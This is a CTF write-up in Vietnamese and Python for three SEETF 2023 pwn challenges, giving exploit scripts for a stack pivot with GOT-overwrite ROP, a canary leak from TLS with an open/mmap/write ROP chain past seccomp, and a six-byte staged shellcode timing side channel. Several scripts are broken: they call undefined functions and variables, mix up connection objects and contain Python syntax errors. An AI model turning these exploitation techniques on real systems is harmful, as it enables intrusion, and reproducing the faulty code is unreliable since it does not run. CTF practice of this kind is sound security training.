## Write Ups SEETF_2023: 
> Author: lawliet _From phis1Ng_ 
# Some challs in pwns category that I solved:

* 1. Great - Expectations:
    `Description: Ask no questions, and you'll be told no lies. `

>> Ở bài này, trong hàm `input_floats()` có khai báo mảng buf kiểu char với (3 bytes), nhưng có lỗi khi format nhập vào là %f (4 bytes), nên từ 3 lần ghi đề cho, ta có thể đè nhiều nhất 3 bytes xuống canary (kí tự 'A') và 2 bytes của saved_rbp của hàm main. Vì vậy, í tưởng ở đây là ta ghi đè 1 byte (hoặc 2 bytes) của saved_rbp để khiến cho ret trỏ tới chuỗi mà ta mong muốn. Đầu chương trình cho ta nhập nhiều nhất 0x107 kí tự, nên ta có thể pivot stack đến đó, để khiến ret trỏ tới chuỗi payload mà ta muốn.
Để không phải leak libc rồi quay lại hàm main 1 lần nữa thì vì chúng ta có thể ghi đè lên bảng GOT nên ý tưởng của em là dùng ROP để thay đổi địa chỉ của hàm nào đó về one_gadgets, vì offset giữa 2 hàm trong libc luôn cố định nên ta có thể dùng gadget `add dword ptr [rbp - 0x3d], ebx ; nop ; ret` để cộng/trừ offset sao cho địa chỉ đó trỏ tới system

Ta thấy nửa byte đầu của bytes thứ 2 sau LSB của saved_rbp chỉ cách 1 đơn vị so với địa chỉ của buffer mà chương trình cho ta nhập vào. Hơn nữa, byte cuối luôn kết thúc bằng 0x00, 0x10, ..., 0xf0 . Nên ta có cơ hội 1/16 để pivot stack về buffer, xong cộng 1 để bypass check [rbp-1] với A. 

> Solve scripts:

```py
#!/usr/bin/env python3
from pwn import *
import time
import sys
import struct

local = 0
debug = 0

context.arch = 'amd64'
# context.aslr = False
context.log_level = 'debug'
# context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
# context.timeout = 2

def riconn():
	global local
	global debug

	for arg in sys.argv[1:]:
		if arg in ('-l', '--local'):
			local = 1
		if arg in ('-d', '--debug'):
			debug = 1

	if local:
		io = process('./chall_patched')
		if debug:
			gdb.attach(s, gdbscript='''
            b* 0x00000000004012ae
            b* 0x00000000004011fc
            c
			''')
		else:
			pass
	else:
		io = remote('win.the.seetf.sg', 2004)

	return io


elf = ELF('./chall_patched')
libc = ELF('libc.so.6')


pop_rdi = 0x0000000000401313
pop_rsi_r15 = 0x0000000000401311
leave_ret = 0x000000000040122c
pop_rbp = 0x000000000040119d
ret = 0x000000000040101a
main = 0x000000000040122e
main_no_push = main+1
input_floats = 0x00000000004011b6
put_gots = 0x404018
csu = 0x40130a
add_what_where = 0x000000000040119c # add dword ptr [rbp - 0x3d], ebx ; nop ; ret


def hex_to_float(hex_str):
    binary_str = bytes.fromhex(hex_str)
    unpacked = struct.unpack('!f', binary_str)
    return unpacked[0]

try:
	io = riconn()
	payload = 0x61*b'A' + 8*b'A' + p64(csu) + p64(0x5f6de) + p64(put_gots+0x3d) + p64(0)*4 + p64(add_what_where) + p64(elf.sym['puts'])
	value = '3.544850151698461e-38'
	io.sendafter(b'ale.\n',payload)
	io.sendlineafter(b'number!\n', b'1')
	io.sendlineafter(b'number!\n', value.encode())
	io.sendlineafter(b'number!\n', b'+')	
	io.interactive()

except:
    io.close()
```

# flag: SEE{Im_f33ling_1ucky_e27e006fe918ab56}


* 2. Mmap note:

    `Description: I made a basic note program but with sandbox. And no more chunk for house of xxx. Can you still get the flag?`

>> Ở bài này, chúng ta có thể allocate 1 số chunks với size 0x1000. Nếu phân bổ hết lượng bộ nhớ trên Heap và khiến cho chunks mới phải dùng mmaped(). Điều đó khiến ta có 1 số chunk nằm trên Thread Local Storage (TLS) được đặt với 1 offset không đổi so với libc trong vùng nhớ.
```
__int64 write_0()
{
  unsigned int v1; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  v1 = 0;
  printf("idx = ");
  __isoc99_scanf("%d", &v1);
  if ( v1 < dword_404590 )
  {
    printf("size to write = ");
    __isoc99_scanf("%d", &sizes[v1]);
    if ( sizes[v1] <= 4096 )
    {
      read(0, (void *)chunk[v1], sizes[v1]);
      return 1LL;
    }
    else
    {
      puts("too much");
      return 0LL;
    }
  }
  else
  {
    puts("invalid idx");
    return 0LL;
  }
}
```

Lỗi thứ 2 ở hàm write(), ta thấy lỗi integer overflow, nên chúng ta có thể đọc nhiều hơn 0x1000 bytes. Điều này cho phép ta có thể đọc được cả canary được lưu giữ trong 1 offset cố định trên TLS (vì hàm write in ra cả nullbyte). 
Sau đó, chúng ta dùng để dùng rop chain open->read->write để ánh xạ file flag vào bộ nhớ chương trình và xuất nó ra thiết bị xuất chuẩn.

OOPs, chúng ta lại không có read() để đọc file vào bộ nhớ (vì chương trình đã dùng seccomp để chặn các hàm đó lại). May mắn thay, em tìm thấy bài viết này 
`https://stackoverflow.com/questions/74743307/mmap-open-and-read-from-file`. Dùng mmap() để read(). Ok, vậy mọi thứ đã rõ ràng rồi, tiến hành exploit thôi:

> Solve scripts:

```py
#!/usr/bin/env python3

from pwn import *
from ctypes import *
import time
import sys

local = 0
debug = 0

context.arch = 'amd64'
# context.aslr = False
# context.log_level = 'debug'
# context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
# context.timeout = 2

def riconn():
	global local
	global debug

	for arg in sys.argv[1:]:
		if arg in ('-l', '--local'):
			local = 1
		if arg in ('-d', '--debug'):
			debug = 1

	if local:
		io = process('./chall_patched')
		if debug:
			gdb.attach(s, gdbscript='''
            b* 0x0000000000401930
            b* 0x0000000000401953
            continue
			''')
		else:
			raw_input('DEBUG')
	else:
		io = remote('103.162.14.240', 15001)

	return io

io = conn()

elf = ELF('./chall_patched')
libc = ELF('libc.so.6')

pop_rax = 0x0000000000401491
pop_rdi = 0x000000000040148f
pop_rsi = 0x0000000000401493
pop_rsp = 0x00000000004014a0
pop_r10 = 0x0000000000401497
pop_r8 = 0x000000000040149a
pop_r9 = 0x000000000040149d
pop_rdx = 0x0000000000401495

sys_call = 0x00000000004014a8

# Stage 1 : Leak canary and Libc :
    
def create_note():
    io.sendlineafter(b'> ', b'1')

def write_note(idx, size=0x1000):
    io.sendlineafter(b'> ', b'2')
    io.sendlineafter(b'idx = ', str(idx).encode())
    io.sendlineafter(b'size to write = ', f"{size}".encode())

def read_note(idx):
    io.sendlineafter(b'> ', b'3')
    io.sendlineafter(b'idx = ', str(idx).encode())


for i in range(30):
    create_note()
    if i ==0:
        p.recvuntil(b"Addr of note 0 is 0x")
        addr_0=int(p.recvuntil(b"\n").rstrip().decode(),16)
    sleep(0.1)

write_note(0, size=100, b'flag\0')
write_note(3, size=0x1740+0x100) 
read_note(3)

for i in range(0x10):
	p.recv(0x100)
	log.info("")
	sleep(0.5)

sleep(1)
p.recv(0x760+9-1)
sleep(1)
canary = u64(p.recv(8))
log.info(f"canary = {hex(canary)}")

payload = b'A'*24 // fill buff and saved_rbp
payload += flat(pop_rax, 2, pop_rdi, base+0xf00, pop_rsi, 0, pop_rdx, 0,\
                syscall_ret, pop_rax, 9, pop_rdi, 0x13370000, pop_rsi, 0x1000,\ # open
                pop_rdx, 7, pop_r10, 2, pop_r8, 3, pop_r9, 0, syscall_ret,\  # mmap
                pop_rax, 1, pop_rdi, 1, pop_rsi, 0x13370000, pop_rdx, 0x40, syscall_ret) # write

io.sendline(payload)
io.sendline(b'4')
io.interactive()

```

# flag: SEE{m4st3r_0f_mm4p_5ee2a719bc6a8209e7295d4095ff5181}

* 3. Shellcode As A Service:

    `Description: Hey, welcome to my new SaaS platform! As part of our early access program, we are offering the service for FREE. Our generous free tier gives you a whole SIX BYTES of shellcode to run on our server. What are you waiting for? Sign up now!`

>> Như chương trình đã mô tả, chúng ta phải viết shellcode sẽ được đưa vào để thực thi.
Được cấp cho 6 bytes và có cho phép 2 syscall open, read, ngăn chặn chúng ta in flag ra màn hình. Ý tưởng là chúng ta sẽ viết 1 vòng lặp để kiểm tra từng bit của flag, nếu bit bằng 1 sẽ cho vào 1 vòng lặp, còn ngược lại thì bit bằng 0.
Một cách khác là ta sẽ đọc từng bytes của flag rồi kiểm tra.

Ngay lúc này, thanh ghi rdi đang có giá trị bằng 0, rdx thì là địa chỉ nơi mà shellcode chúng ta ghi nên chúng ta chỉ cần lấy giá trị đó là đủ để ghi tiếp (second stage write).


> Solve scripts:

```py
from pwn import *
import struct

#!/usr/bin/env python3

from pwn import *
from ctypes import *
import time
import sys

local = 0
debug = 0

context.arch = 'amd64'
# context.aslr = False
# context.log_level = 'debug'
# context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
# context.timeout = 2

def riconn():
	global local
	global debug

	for arg in sys.argv[1:]:
		if arg in ('-l', '--local'):
			local = 1
		if arg in ('-d', '--debug'):
			debug = 1

	if local:
		io = process('./chall')
		if debug:
			gdb.attach(s, gdbscript='''
			''')
		else:
			raw_input('DEBUG')
	else:
		io = remote('103.162.14.240', 15001)

	return io


elf = ELF('./chall')
#libc = ELF('libc.so.6')

def chill(offset):
    bin = ''
    for bit in range(8):
        io = conn()
        stage1 = asm(f"""
        xor edi, edi
        mov esi, edx
        syscall
        """, arch='amd64')

        io.send(stage1)

        stage2 = asm(("""
        .rept 0x6
        nop
        .endr
        """ 
            + shellcraft.amd64.linux.open('/flag')
            + shellcraft.amd64.linux.read('rax', 'rsp', 0x100)
            + f"""
            xor r11, r11
            xor rax, rax
            mov al, [rsp+{offset}]
            shr al, {bit}
            shl al, 7
            shr al, 7
        loop:
            cmp rax, r11
            je end
            jmp loop
        end:
        """
        ), arch='amd64')

        io.send(stage2)
        start = time.time()
        io.recvall(timeout=1).decode()
        now = time.time()

        if (now - start) > 1:
            bin_str += '1'
        else:
            bin_str += '0'

    byte = int(bin[::-1], 2)

    return byte


tmp = []
for i in range(100):
    tmp.append(chill(i))
    if tmp[-1] == '}':
        break
    
flag = [x.decode() for x in tmp]
flag = ''.join(flag)
```

# flag: SEE{n1c3_sh3llc0ding_d6e25f87c7ebeef6e80df23d32c42d00}








